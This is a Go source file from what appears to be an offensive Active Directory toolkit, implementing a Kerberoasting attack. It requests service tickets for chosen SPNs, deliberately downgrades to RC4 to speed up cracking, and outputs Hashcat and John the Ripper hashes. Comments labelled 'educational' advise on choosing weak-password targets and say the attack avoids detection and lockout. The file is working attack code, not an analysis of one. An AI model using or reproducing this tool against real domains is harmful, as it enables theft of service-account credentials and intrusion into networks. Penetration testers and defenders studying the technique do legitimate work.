package roast

import (
	"context"
	"fmt"
	"strings"

	"github.com/goobeus/goobeus/pkg/client"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: Kerberoasting
//
// Kerberoasting exploits how Kerberos encrypts service tickets:
//
// 1. Any authenticated user can request a TGS for any SPN
// 2. The TGS is encrypted with the service account's password hash
// 3. We extract the encrypted part and crack it offline
// 4. If the service account uses a weak password, we get credentials!
//
// Why it works:
// - No special privileges needed (any domain user)
// - No detection from the service itself (never contact it)
// - Offline cracking = no account lockout
//
// Best targets:
// - Service accounts with old passwords
// - Accounts created by humans (weak passwords)
// - Avoid computer accounts (random 120-char passwords)

// KerberoastRequest configures a Kerberoasting attack.
type KerberoastRequest struct {
	// Authentication
	TGT        *ticket.Kirbi
	SessionKey []byte

	// Target accounts
	SPNs []string // Specific SPNs to roast

	// Output options
	Format HashFormat

	// Connection
	Domain string
	KDC    string
}

// HashFormat specifies the output hash format.
type HashFormat int

const (
	FormatHashcat HashFormat = iota // Hashcat format (default)
	FormatJohn                      // John the Ripper format
	FormatBoth                      // Both formats
)

// KerberoastResult contains a Kerberoasted hash.
type KerberoastResult struct {
	SPN      string
	Account  string // Service account name (if known)
	Hash     string // Hashcat format
	HashJohn string // John format
	EType    int32  // Encryption type
	Ticket   *ticket.Kirbi
}

// Kerberoast performs a Kerberoasting attack.
//
// EDUCATIONAL: Attack Flow
//
// For each target SPN:
// 1. Send TGS-REQ for the SPN (using our TGT)
// 2. Receive TGS-REP with encrypted service ticket
// 3. Extract hash from encrypted ticket
// 4. Format for cracking with Hashcat/John
//
// RC4 (etype 23) is fastest to crack - 10,000x faster than AES!
func Kerberoast(ctx context.Context, req *KerberoastRequest) ([]KerberoastResult, error) {
	if req.TGT == nil {
		return nil, fmt.Errorf("TGT is required")
	}
	if len(req.SPNs) == 0 {
		return nil, fmt.Errorf("at least one SPN is required")
	}

	var results []KerberoastResult

	for _, spn := range req.SPNs {
		// Request service ticket for this SPN
		tgsReq := &client.TGSRequest{
			TGT:        req.TGT,
			SessionKey: req.SessionKey,
			Service:    spn,
			Domain:     req.Domain,
			KDC:        req.KDC,
			Etype:      23, // Prefer RC4 for faster cracking
		}

		tgsResult, err := client.AskTGSWithContext(ctx, tgsReq)
		if err != nil {
			// Log but continue with other SPNs
			continue
		}

		// Extract account name from SPN
		account := extractAccountFromSPN(spn)

		// Generate hashes
		result := KerberoastResult{
			SPN:     spn,
			Account: account,
			EType:   tgsResult.Ticket.EncPart.EType,
			Ticket:  tgsResult.Kirbi,
			Hash:    tgsResult.Hash,
		}

		// Generate John format if requested
		if req.Format == FormatJohn || req.Format == FormatBoth {
			result.HashJohn = generateJohnHash(tgsResult.Kirbi, spn)
		}

		results = append(results, result)
	}

	return results, nil
}

// extractAccountFromSPN tries to get the account name from an SPN.
func extractAccountFromSPN(spn string) string {
	// SPN format: service/host
	parts := strings.Split(spn, "/")
	if len(parts) >= 2 {
		return parts[1]
	}
	return spn
}

// generateJohnHash generates John the Ripper format hash.
func generateJohnHash(tkt *ticket.Kirbi, spn string) string {
	if tkt == nil || tkt.Ticket() == nil {
		return ""
	}

	t := tkt.Ticket()
	cipher := t.EncPart.Cipher

	switch t.EncPart.EType {
	case 23: // RC4
		if len(cipher) < 16 {
			return ""
		}
		return fmt.Sprintf("$krb5tgs$%s:%x", spn, cipher)
	case 17, 18: // AES
		if len(cipher) < 12 {
			return ""
		}
		return fmt.Sprintf("$krb5tgs$%d$%s:%x", t.EncPart.EType, spn, cipher)
	}

	return ""
}
